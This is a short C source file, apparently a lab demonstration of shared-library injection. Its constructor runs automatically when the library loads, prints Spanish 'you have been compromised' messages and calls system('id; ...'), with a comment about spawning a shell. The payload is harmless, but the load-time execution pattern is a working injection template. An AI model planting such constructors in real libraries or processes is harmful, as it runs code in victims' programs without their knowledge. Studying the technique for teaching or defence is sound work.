#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

/*
 * This function will be executed automatically when the shared library is loaded.
 * It simulates a DLL Injection where DllMain is executed upon loading.
 */
__attribute__((constructor)) void init() {
    printf("\n[!!!] MALICIOUS LIBRARY LOADED [!!!]\n");
    printf("[!!!] Ejecutando código inyectado en el contexto del proceso %d [!!!]\n", getpid());
    
    // Spawn a shell or execute a command
    system("id; echo 'Has sido comprometido.'");
}
